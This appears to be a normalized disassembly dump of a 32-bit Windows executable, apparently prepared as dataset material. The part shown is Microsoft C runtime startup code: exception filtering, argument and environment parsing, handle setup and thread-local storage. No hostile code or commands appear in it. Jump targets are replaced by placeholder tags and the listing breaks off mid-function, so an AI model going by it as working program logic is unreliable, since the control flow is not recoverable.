lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
mov [ ebp - 0x4 ] ecx
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x4 ]
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0xc ]
movzx ecx cx
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov ecx [ ebp + 0xc ]
movzx cx [ ecx ]
inc [ ebp + 0xc ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp si bx
je r-xdata
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
mov cx [ ebp - 0x4 ]
add si [ eax + 0x1a ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
movzx cx [ edi ]
dec [ ebp + 0x10 ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_200c85d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_201894d
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_200c8ad
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_201a646
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_201a646
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_2016140
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
push esi
call sub_2016140
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_2016140
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_201a591
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_200acc7
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_201a428
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
push r--data
push ebx
push edi
call sub_200acc7
add esp 0xc
test eax eax
je r-xdata
sub_200ca58
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_200ca7e
push 0x3
call sub_201a646
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_200c8ad
push 0xff
call sub_200c8ad
pop ecx
pop ecx
push 0x3
call sub_201a646
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_200cab8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
pop ebp
retn
sub_200caed
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_200d6da
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_200cc4d
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_200caed
pop ecx
pop ecx
pop ebp
retn
sub_200cc6d
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_200e505
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_201a8b2
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_200cccc
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_200e505
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_201a9e3
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_2016140
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_2016140
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_2009d98
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_201a9e3
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_2009d98
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
sub_200cdb9
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_201a8b2
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_201a8b2
pop ecx
test eax eax
je r-xdata
call sub_201a8b2
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_200cf55
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_200e505
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_200cdb9
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_201a99e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_200cdb9
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_200d010
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_201a99e
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_201a99e
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_2013e10
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_2009d98
pop ecx
mov [ ebp - 0x4 ] ebx
sub_200d147
push 0x54
push r--data
call sub_200db54
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_201a9e3
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_201a9e3
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_200db99
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_2019192
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_2019192
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_200d39b
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_2009d98
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_200d3e9
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_200d40f
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_200d44f
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_200b6b7
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_200d4ca
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_200b6b7
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_200d565
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_200d4ca
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_200d5b6
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_2010cf3
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_200d5f3
push 0xc
push r--data
call sub_200db54
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_200b6b7
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200d6c8
push 0xc
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_200e678
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200d6d1
call sub_200db99
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_200d6da
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_200d565
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_201a9e3
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_2009d98
pop ecx
xor esi esi
push 0x0
push esi
call sub_200d5f3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_200d76d
push 0x8
push r--data
call sub_200db54
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_200db99
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_2009d98
pop ecx
push 0xd
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_2009d98
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200d887
push 0xc
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200d893
push esi
call sub_2009d98
pop ecx
push edi
call sub_200e707
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_2009d98
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_200e52f
pop ecx
sub_200d89c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_200d76d
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_200d916
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_200b6b7
pop ecx
call sub_200d5b6
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
